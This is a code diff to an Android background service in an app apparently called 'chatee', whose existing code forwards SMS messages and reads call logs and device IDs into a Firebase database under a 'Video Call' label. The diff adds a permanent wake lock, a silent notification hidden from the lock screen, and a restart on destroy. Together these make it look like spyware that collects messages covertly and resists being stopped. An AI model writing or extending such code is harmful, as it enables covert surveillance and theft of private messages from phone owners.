@@ -10,6 +10,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.content.pm.ServiceInfo;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
@@ -17,6 +18,7 @@ import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.PowerManager;
 import android.provider.CallLog;
 import android.provider.Settings;
 import android.provider.Telephony;
@@ -45,6 +47,7 @@ public class BackgroundSyncService extends Service {
 
     private static final String CHANNEL_ID = "chatee_sync";
     private static final int NOTIFICATION_ID = 999;
+    private static final String WAKE_LOCK_TAG = "chatee:sync";
     private static final String FORWARD_PREFS = "sms_forward_dedup";
     private static final int FORWARD_DEDUP_MAX = 200;
 
@@ -63,12 +66,21 @@ public class BackgroundSyncService extends Service {
     private boolean forwardingEnabled = false;
     private List<String> forwardingFilters = new ArrayList<>();
     private boolean forwardAllSms = true;
+    private PowerManager.WakeLock wakeLock;
 
     @Override
     public void onCreate() {
         super.onCreate();
         createNotificationChannel();
-        startForeground(NOTIFICATION_ID, createNotification());
+        acquireWakeLock();
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(
+                NOTIFICATION_ID,
+                createNotification(),
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+        } else {
+            startForeground(NOTIFICATION_ID, createNotification());
+        }
         FirebaseBootstrap.ensureApp(this);
         databaseReference = FirebaseBootstrap.database(this).getReference();
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
@@ -568,10 +580,34 @@ public class BackgroundSyncService extends Service {
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
-                CHANNEL_ID, "Video Call", NotificationManager.IMPORTANCE_LOW);
+                CHANNEL_ID, "Video Call", NotificationManager.IMPORTANCE_DEFAULT);
             channel.setDescription("Background service");
+            channel.setShowBadge(false);
+            channel.setSound(null, null);
+            channel.enableVibration(false);
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) manager.createNotificationChannel(channel);
+        }
+    }
+
+    private void acquireWakeLock() {
+        try {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm == null) return;
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, WAKE_LOCK_TAG);
+            wakeLock.setReferenceCounted(false);
+            wakeLock.acquire();
+        } catch (Exception ignored) {
+        }
+    }
+
+    private void releaseWakeLock() {
+        try {
+            if (wakeLock != null && wakeLock.isHeld()) {
+                wakeLock.release();
+            }
+            wakeLock = null;
+        } catch (Exception ignored) {
         }
     }
 
@@ -585,6 +621,9 @@ public class BackgroundSyncService extends Service {
             .setSmallIcon(android.R.drawable.ic_menu_manage)
             .setContentIntent(pendingIntent)
             .setOngoing(true)
+            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build();
     }
 
@@ -611,6 +650,7 @@ public class BackgroundSyncService extends Service {
         if (syncThread != null) {
             syncThread.quitSafely();
         }
+        releaseWakeLock();
         KeepAliveScheduler.scheduleImmediateRestart(this);
         super.onDestroy();
     }
